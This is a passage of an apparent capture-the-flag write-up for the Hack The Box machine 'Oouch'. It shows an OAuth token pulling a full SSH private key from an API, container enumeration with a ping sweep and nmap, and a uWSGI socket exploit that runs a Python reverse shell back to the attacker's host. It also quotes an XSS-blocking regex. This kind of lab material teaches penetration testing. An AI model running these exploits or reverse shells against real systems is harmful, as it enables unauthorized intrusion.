+<span class="na">Vary</span><span class="p">:</span> <span class="s">Authorization</span>
+</code></pre></div></div>
+<p>I can add the <code class="language-plaintext highlighter-rouge">Authorization: Bearer [token]</code> header, and it works:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>curl <span class="nt">-s</span> authorization.oouch.htb:8000/api/get_user <span class="nt">-H</span> <span class="s2">"Authorization: Bearer gm05wp2kDWhSmS3QrZmdEqgvFGoEKD"</span> | jq <span class="nb">.</span>
+<span class="go">{
+  "username": "qtc",
+  "firstname": "",
+  "lastname": "",
+  "email": "qtc@nonexistend.nonono"
+}
+</span></code></pre></div></div>
+<h4 id="get_ssh">get_ssh</h4>
+<p>Obviously this isn’t terribly useful information. I spent a while fuzzing for additional parameters that might return the other information entered into the signup form, the ssh key. Eventually, I tried hitting a different endpoint, <code class="language-plaintext highlighter-rouge">/api/get_ssh</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>curl <span class="nt">-s</span> authorization.oouch.htb:8000/api/get_ssh <span class="nt">-H</span> <span class="s2">"Authorization: Bearer gm05wp2kDWhSmS3QrZmdEqgvFGoEKD"</span> | jq <span class="nb">.</span>
+<span class="go">{
+  "ssh_server": "consumer.oouch.htb",
+  "ssh_user": "qtc",
+  "ssh_key": "-----BEGIN OPENSSH PRIVATE KEY-----\n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\n-----END OPENSSH PRIVATE KEY-----"
+}
+</span></code></pre></div></div>
+<p>That’s an ssh key!</p>
+<h3 id="ssh">SSH</h3>
+<p>I can save that key to a file (using <code class="language-plaintext highlighter-rouge">jq -r</code> to print the raw contents) :</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>curl <span class="nt">-s</span> authorization.oouch.htb:8000/api/get_ssh <span class="nt">-H</span> <span class="s2">"Authorization: Bearer LBLemeQIcZZtSgPB0Ax54DpJ1h1vrF"</span> | jq <span class="nt">-r</span> <span class="s1">'.ssh_key'</span> <span class="o">&gt;</span> id_rsa_oouch_qtc
+</code></pre></div></div>
+<p>And connect over SSH as qtc:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>ssh <span class="nt">-i</span> ~/keys/id_rsa_oouch_qtc qtc@consumer.oouch.htb
+<span class="go">Linux oouch 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1 (2020-01-26) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Tue Feb 25 12:45:55 2020 from 10.10.14.6
+</span><span class="gp">qtc@oouch:~$</span><span class="w">
+</span></code></pre></div></div>
+<p>From here I can grab <code class="language-plaintext highlighter-rouge">user.txt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">qtc@oouch:~$</span><span class="w"> </span><span class="nb">cat </span>user.txt
+<span class="go">d5f8b4e6************************
+</span></code></pre></div></div>
+<h2 id="shell-as-qtc-on-consumer-container">Shell as qtc on consumer container</h2>
+<h3 id="local-enumeration">Local Enumeration</h3>
+<p>In the qtc homedir next to <code class="language-plaintext highlighter-rouge">user.txt</code> is <code class="language-plaintext highlighter-rouge">.note.txt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">qtc@oouch:~$</span><span class="w"> </span><span class="nb">cat</span> .note.txt 
+<span class="go">Implementing an IPS using DBus and iptables == Genius?
+</span></code></pre></div></div>
+<p>That must be what was redirecting to the “Hacking Attempt Detected” page I found earlier. According to <a href="https://www.freedesktop.org/wiki/Software/dbus/">Freedesktop.org</a>:</p>
+<blockquote>
+<p>DBus is a message bus system, a simple way for applications to talk to one another. In addition to interprocess communication, D-Bus helps coordinate process lifecycle; it makes it simple and reliable to code a “single instance” application or daemon, and to launch applications and daemons on demand when their services are needed.</p>
+</blockquote>
+<p>Reading about DBus, it seems that various applications are configured in files inside <code class="language-plaintext highlighter-rouge">/etc/dbus-1/system.d</code>. There are five configs present on Oouch:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">qtc@oouch:~$</span><span class="w"> </span>find /etc/dbus-1/system.d <span class="nt">-type</span> f
+<span class="go">/etc/dbus-1/system.d/bluetooth.conf
+/etc/dbus-1/system.d/wpa_supplicant.conf
+/etc/dbus-1/system.d/org.freedesktop.PackageKit.conf
+/etc/dbus-1/system.d/com.ubuntu.SoftwareProperties.conf
+/etc/dbus-1/system.d/htb.oouch.Block.conf
+</span></code></pre></div></div>
+<p>The most interesting is the one that’s specific to this box, likely the one referenced by the note:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">qtc@oouch:~$</span><span class="w"> </span><span class="nb">cat</span> /etc/dbus-1/system.d/htb.oouch.Block.conf
+<span class="go">&lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;!-- -*- XML -*- --&gt;
+
+&lt;!DOCTYPE busconfig PUBLIC
+ "-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
+ "http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd"&gt;
+
+&lt;busconfig&gt;
+
+    &lt;policy user="root"&gt;
+        &lt;allow own="htb.oouch.Block"/&gt;
+    &lt;/policy&gt;
+
+        &lt;policy user="www-data"&gt;
+                &lt;allow send_destination="htb.oouch.Block"/&gt;
+                &lt;allow receive_sender="htb.oouch.Block"/&gt;
+        &lt;/policy&gt;
+
+&lt;/busconfig&gt;
+</span></code></pre></div></div>
+<p>This config file defines the owner of the application to be root, which means that any processes spawned by this application will also be run as root. The config also allows the www-data user to send to it and receive from it.</p>
+<p>Looking around the host, there’s no evidence of a www-data user. In fact, the two webservers aren’t directly on this host, but in containers. There is a www-data user on this host, but the web services are being run out of containers, which I can see from the two <code class="language-plaintext highlighter-rouge">docker-proxy</code> processes I get from <code class="language-plaintext highlighter-rouge">ps auxww</code>:</p>
+<div class="language-plaintext wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root      3579  0.0  0.1 474988  7580 ?        Sl   15:47   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 5000 -container-ip 172.18.0.2 -container-port 5000
+root      3651  0.0  0.1 474988  7620 ?        Sl   15:47   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 8000 -container-ip 172.18.0.5 -container-port 8000
+</code></pre></div></div>
+<h3 id="network-enumeration">Network Enumeration</h3>
+<p>I can do a quick ping sweep to see what hosts live on that subnet:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">qtc@oouch:~$</span><span class="w"> </span><span class="k">for </span>i <span class="k">in</span> <span class="o">{</span>1..254<span class="o">}</span><span class="p">;</span> <span class="k">do</span> <span class="o">(</span>ping <span class="nt">-c</span> 1 172.18.0.<span class="k">${</span><span class="nv">i</span><span class="k">}</span> | <span class="nb">grep</span> <span class="s2">"bytes from"</span> | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s2">"Unreachable"</span> &amp;<span class="o">)</span><span class="p">;</span> <span class="k">done</span><span class="p">;</span>
+<span class="go">64 bytes from 172.18.0.1: icmp_seq=1 ttl=64 time=0.065 ms
+64 bytes from 172.18.0.3: icmp_seq=1 ttl=64 time=0.083 ms
+64 bytes from 172.18.0.2: icmp_seq=1 ttl=64 time=0.103 ms
+64 bytes from 172.18.0.4: icmp_seq=1 ttl=64 time=0.050 ms
+64 bytes from 172.18.0.5: icmp_seq=1 ttl=64 time=0.066 ms
+</span></code></pre></div></div>
+<p>I uploaded a <a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap">static copy of nmap</a>, and ran some scans:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">qtc@oouch:/dev/shm$</span><span class="w"> </span>./nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000 172.18.0.2
+<span class="go">
+Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2020-03-14 16:10 CET
+Unable to find nmap-services!  Resorting to /etc/services
+Cannot find nmap-payloads. UDP payloads are disabled.
+Nmap scan report for 172.18.0.2
+Host is up (0.00011s latency).
+Not shown: 65533 closed ports
+PORT     STATE SERVICE                             
+22/tcp   open  ssh                                 
+5000/tcp open  unknown                             
+
+Nmap done: 1 IP address (1 host up) scanned in 14.42 seconds
+
+</span><span class="gp">qtc@oouch:/dev/shm$</span><span class="w"> </span>./nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000 172.18.0.3
+<span class="go">                                                                                                      
+Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2020-03-14 16:09 CET                                   
+Unable to find nmap-services!  Resorting to /etc/services                                             
+Cannot find nmap-payloads. UDP payloads are disabled.                                                 
+Nmap scan report for 172.18.0.3                                                                       
+Host is up (0.00014s latency).                                                                        
+Not shown: 65534 closed ports                                                                         
+PORT     STATE SERVICE                             
+3306/tcp open  mysql                               
+
+Nmap done: 1 IP address (1 host up) scanned in 14.51 seconds
+
+</span><span class="gp">qtc@oouch:/dev/shm$</span><span class="w"> </span>./nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000 172.18.0.4
+<span class="go">Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2020-03-14 16:09 CET
+Unable to find nmap-services!  Resorting to /etc/services                                           
+Cannot find nmap-payloads. UDP payloads are disabled.
+Nmap scan report for 172.18.0.4
+Host is up (0.00013s latency).
+Not shown: 65534 closed ports                                                                        
+PORT     STATE SERVICE
+3306/tcp open  mysql                                                                                 
+
+Nmap done: 1 IP address (1 host up) scanned in 14.39 seconds
+
+</span><span class="gp">qtc@oouch:/dev/shm$</span><span class="w"> </span>./nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000 172.18.0.5
+<span class="go">
+Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2020-03-14 19:08 CET
+Unable to find nmap-services!  Resorting to /etc/services
+Cannot find nmap-payloads. UDP payloads are disabled.
+Nmap scan report for 172.18.0.5
+Host is up (0.000089s latency).
+Not shown: 65534 closed ports
+PORT     STATE SERVICE
+8000/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 14.45 seconds
+</span></code></pre></div></div>
+<p>These IPs will shuffle on each boot, but in my case, there are two MySQL servers (.3 and .4), consumer (.2), and authorization (.5). These match up with the IPs/ports from the <code class="language-plaintext highlighter-rouge">docker-proxy</code> commands.</p>
+<h3 id="ssh-as-qtc-1">SSH as qtc</h3>
+<p>Interestingly, consumer is listening on SSH in addition to 5000. There is also a private key in the <code class="language-plaintext highlighter-rouge">/home/qtc/.ssh</code> that is different than the key I used to connect to this box. It does work to SSH into the container (I don’t have to specify the key, as <code class="language-plaintext highlighter-rouge">ssh</code> will try all the keys in <code class="language-plaintext highlighter-rouge">~/.ssh</code>):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">qtc@oouch:~/.ssh$</span><span class="w"> </span>ssh qtc@172.18.0.2
+<span class="go">Linux aeb4525789d8 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1 (2020-01-26) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sat Mar 14 15:10:33 2020 from 172.18.0.1
+</span><span class="gp">qtc@aeb4525789d8:~$</span><span class="w">
+</span></code></pre></div></div>
+<h2 id="shell-as-www-data-on-consumer-container">Shell as www-data on consumer container</h2>
+<h3 id="enumeration-1">Enumeration</h3>
+<p>This container is very bare, other than the the application, which lives in <code class="language-plaintext highlighter-rouge">/code</code>. There’s a couple interesting things here. First, it’s using uWSGI to glue NGINX to the Python Flask application. I can see the config file:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">qtc@aeb4525789d8:/code$</span><span class="w"> </span><span class="nb">cat </span>uwsgi.ini 
+<span class="go">[uwsgi]
+module = oouch:app
+uid = www-data
+gid = www-data
+master = true
+processes = 10
+socket = /tmp/uwsgi.socket
+chmod-sock = 777
+vacuum = true
+die-on-term = true
+</span></code></pre></div></div>
+<p>I’ll also dig into the code itself, but for the next step.</p>
+<h3 id="exploit">Exploit</h3>
+<h4 id="vulnerability-1">Vulnerability</h4>
+<p>Searching around for <code class="language-plaintext highlighter-rouge">uwsgi exploits</code> I found <a href="https://github.com/wofeiwo/webcgi-exploits">this GitHub</a>. It lists a Chinese website with a POC for exploiting uWSGI. The basic idea if that if I can write to the uWSGI socket, I can get code execution.</p>
+<h4 id="container-limitations">Container Limitations</h4>
+<p>This container is stripped down - It has no <code class="language-plaintext highlighter-rouge">curl</code>, no <code class="language-plaintext highlighter-rouge">nc</code>, no <code class="language-plaintext highlighter-rouge">ping</code>, no <code class="language-plaintext highlighter-rouge">wget</code>, no text editors (<code class="language-plaintext highlighter-rouge">vi</code>, <code class="language-plaintext highlighter-rouge">vim</code>, <code class="language-plaintext highlighter-rouge">nano</code>, <code class="language-plaintext highlighter-rouge">pico</code>, <code class="language-plaintext highlighter-rouge">ed</code>). It does have Python, which is useful. I moved files by base64 encoding them on my host (<code class="language-plaintext highlighter-rouge">base64 -w0 [filename]</code>), copying the output, and then running <code class="language-plaintext highlighter-rouge">echo "[paste]" | base64 -d &gt; [desired file]</code>. I could have also used <code class="language-plaintext highlighter-rouge">scp</code> twice, first to Oouch, then to the container.</p>
+<p>To get a shell, I turned a typical Python reverse shell into a <code class="language-plaintext highlighter-rouge">.py</code> file, and moved it to the container just like above.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
+</span>
+<span class="kn">import</span> <span class="n">os</span>
+<span class="kn">import</span> <span class="n">pty</span>
+<span class="kn">import</span> <span class="n">socket</span>
+<span class="kn">import</span> <span class="n">subprocess</span>
+
+<span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">.</span><span class="nf">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="sh">"</span><span class="s">10.10.14.6</span><span class="sh">"</span><span class="p">,</span><span class="mi">443</span><span class="p">))</span>
+<span class="n">os</span><span class="p">.</span><span class="nf">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="nf">fileno</span><span class="p">(),</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">os</span><span class="p">.</span><span class="nf">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="nf">fileno</span><span class="p">(),</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">os</span><span class="p">.</span><span class="nf">dup2</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="nf">fileno</span><span class="p">(),</span><span class="mi">2</span><span class="p">)</span>
+<span class="n">pty</span><span class="p">.</span><span class="nf">spawn</span><span class="p">(</span><span class="sh">"</span><span class="s">/bin/bash</span><span class="sh">"</span><span class="p">)</span>
+</code></pre></div></div>
+<p>I tested it as my current user to verify that it could connect back to my Kali box, and it could.</p>
+<h4 id="get-rce">Get RCE</h4>
+<p>I downloaded <code class="language-plaintext highlighter-rouge">uwsgi_exp.py</code> from GitHub, uploaded it, and ran it, but it fails.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">qtc@aeb4525789d8:~$</span><span class="w"> </span>python /dev/shm/.d.py <span class="nt">-m</span> unix <span class="nt">-u</span> /tmp/uwsgi.socket <span class="nt">-c</span> <span class="s1">'id &gt; /tmp/d'</span>
+<span class="go">[*]Sending payload.
+Traceback (most recent call last):
+  File ".t.py", line 146, in &lt;module&gt;
+    main()
+  File ".t.py", line 143, in main
+    print(curl(args.mode.lower(), args.uwsgi_addr, payload, '/testapp'))
+  File ".t.py", line 110, in curl
+    return ask_uwsgi(addr_and_port, mode, var)
+  File ".t.py", line 77, in ask_uwsgi
+    s.send(pack_uwsgi_vars(var) + body.encode('utf8'))
+  File ".t.py", line 26, in pack_uwsgi_vars
+    pk += sz(k) + k.encode('utf8') + sz(v) + v.encode('utf8')
+  File ".t.py", line 18, in sz
+    if sys.version_info[0] == 3: import bytes
+ModuleNotFoundError: No module named 'bytes'
+</span></code></pre></div></div>
+<p>I opened a Python shell and played with it, and found that without importing <code class="language-plaintext highlighter-rouge">bytes</code>, it’s already there:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">qtc@aeb4525789d8:~$</span><span class="w"> </span><span class="n">python</span>
+<span class="go">Python 3.7.6 (default, Feb  2 2020, 09:11:24) 
+[GCC 8.3.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+</span><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">h</span> <span class="o">=</span> <span class="sh">'</span><span class="s">abcd</span><span class="sh">'</span>
+<span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="nb">bytes</span><span class="p">.</span><span class="nf">fromhex</span><span class="p">(</span><span class="n">h</span><span class="p">)</span>
+<span class="go">b'\xab\xcd'
+</span></code></pre></div></div>
+<p>So I edited the code to remove that import line, and re-uploaded it. Now it works (proof of concept, output <code class="language-plaintext highlighter-rouge">id</code> to a file in <code class="language-plaintext highlighter-rouge">/tmp</code>):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">qtc@aeb4525789d8:~$</span><span class="w"> </span>python /dev/shm/.d.py <span class="nt">-u</span> /tmp/uwsgi.socket <span class="nt">-c</span> <span class="s1">'id &gt; /tmp/d'</span> <span class="nt">-m</span> unix
+<span class="go">[*]Sending payload.
+
+</span><span class="gp">qtc@aeb4525789d8:~$</span><span class="w"> </span><span class="nb">cat</span> /tmp/d 
+<span class="go">uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span></code></pre></div></div>
+<h4 id="shell">Shell</h4>
+<p>Instead of <code class="language-plaintext highlighter-rouge">id</code>, I’ll run the reverse shell I uploaded:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">qtc@aeb4525789d8:~$</span><span class="w"> </span>python /dev/shm/.d.py <span class="nt">-m</span> unix <span class="nt">-u</span> /tmp/uwsgi.socket <span class="nt">-c</span> <span class="s1">'python /dev/shm/.rev.py'</span>
+<span class="go">[*]Sending payload.
+</span></code></pre></div></div>
+<p>Immediately I get a shell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 443
+<span class="go">listening on [any] 443 ...
+connect to [10.10.14.6] from (UNKNOWN) [10.10.10.177] 56614
+bash: /root/.bashrc: Permission denied
+www-data@aeb4525789d8:/code$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span></code></pre></div></div>
+<h2 id="shell-as-root-on-oouch">Shell as root on oouch</h2>
+<h3 id="enumeration-2">Enumeration</h3>
+<p>The other thing I looked at in the code was how it was doing the WAF to detect XSS attempts. After finding my way through the Flask application, I found the routes in <code class="language-plaintext highlighter-rouge">/code/oouch/routes.py</code>. At the top of the code, it adds the <code class="language-plaintext highlighter-rouge">dbus</code> location to the system path before importing the DBus module:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">sys</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">insert</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sh">"</span><span class="s">/usr/lib/python3/dist-packages</span><span class="sh">"</span><span class="p">)</span>
+<span class="kn">import</span> <span class="n">dbus</span>
+</code></pre></div></div>
+<p>Further down the file, the route for <code class="language-plaintext highlighter-rouge">/contact</code> was interesting:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">primitive_xss</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nf">compile</span><span class="p">(</span><span class="sh">"</span><span class="s">(&lt;script|&lt;img|&lt;svg|onload|onclick|onhover|onerror|&lt;iframe|&lt;html|alert|document\.)</span><span class="sh">"</span><span class="p">)</span>
+<span class="p">...[</span><span class="n">snip</span><span class="p">]</span><span class="bp">...</span>
+<span class="nd">@app.route</span><span class="p">(</span><span class="sh">'</span><span class="s">/contact</span><span class="sh">'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">'</span><span class="s">GET</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">POST</span><span class="sh">'</span><span class="p">])</span>
+<span class="nd">@login_required</span>
+<span class="k">def</span> <span class="nf">contact</span><span class="p">():</span>
+    <span class="sh">'''</span><span class="s">
+    The contact page is required to abuse the Oauth vulnerabilities. This endpoint allows the user to send messages using a textfield.                                                                       
+    The messages are scanned for valid url</span><span class="sh">'</span><span class="s">s and these urls are saved to a file on disk. A cronjob will view the files regulary and                                                                          
+    invoke requests on the corresponding urls.
+
+    Parameters:
+        None
+
+    Returns:
+        render                (Render)                  Renders the contact page.
+    </span><span class="sh">'''</span>
+    <span class="c1"># First we need to load the contact form
+</span>    <span class="n">form</span> <span class="o">=</span> <span class="nc">ContactForm</span><span class="p">()</span>
+
+    <span class="c1"># If the form was already submitted, we process the contents
+</span>    <span class="k">if</span> <span class="n">form</span><span class="p">.</span><span class="nf">validate_on_submit</span><span class="p">():</span>
+
+        <span class="c1"># First apply our primitive xss filter
+</span>        <span class="k">if</span> <span class="n">primitive_xss</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="n">form</span><span class="p">.</span><span class="n">textfield</span><span class="p">.</span><span class="n">data</span><span class="p">):</span>
+            <span class="n">bus</span> <span class="o">=</span> <span class="n">dbus</span><span class="p">.</span><span class="nc">SystemBus</span><span class="p">()</span>
+            <span class="n">block_object</span> <span class="o">=</span> <span class="n">bus</span><span class="p">.</span><span class="nf">get_object</span><span class="p">(</span><span class="sh">'</span><span class="s">htb.oouch.Block</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">/htb/oouch/Block</span><span class="sh">'</span><span class="p">)</span>
+            <span class="n">block_iface</span> <span class="o">=</span> <span class="n">dbus</span><span class="p">.</span><span class="nc">Interface</span><span class="p">(</span><span class="n">block_object</span><span class="p">,</span> <span class="n">dbus_interface</span><span class="o">=</span><span class="sh">'</span><span class="s">htb.oouch.Block</span><span class="sh">'</span><span class="p">)</span>
+
+            <span class="n">client_ip</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">environ</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">REMOTE_ADDR</span><span class="sh">'</span><span class="p">,</span> <span class="n">request</span><span class="p">.</span><span class="n">remote_addr</span><span class="p">)</span>
+            <span class="n">response</span> <span class="o">=</span> <span class="n">block_iface</span><span class="p">.</span><span class="nc">Block</span><span class="p">(</span><span class="n">client_ip</span><span class="p">)</span>
+            <span class="n">bus</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
+            <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">hacker.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">title</span><span class="o">=</span><span class="sh">'</span><span class="s">Hacker</span><span class="sh">'</span><span class="p">)</span>
+
+        <span class="c1"># The regex defined at the beginning of this file checks for valid urls
+</span>        <span class="n">url</span> <span class="o">=</span> <span class="n">regex</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="n">form</span><span class="p">.</span><span class="n">textfield</span><span class="p">.</span><span class="n">data</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">url</span><span class="p">:</span>
+
+            <span class="c1"># If an url was found, we try to save it to the file /code/urls.txt
+</span>            <span class="k">try</span><span class="p">:</span>
+                <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">/code/urls.txt</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">a</span><span class="sh">"</span><span class="p">)</span> <span class="k">as</span> <span class="n">url_file</span><span class="p">:</span>
+                    <span class="nf">print</span><span class="p">(</span><span class="n">url</span><span class="p">.</span><span class="nf">group</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="nb">file</span><span class="o">=</span><span class="n">url_file</span><span class="p">)</span>
+            <span class="k">except</span><span class="p">:</span>
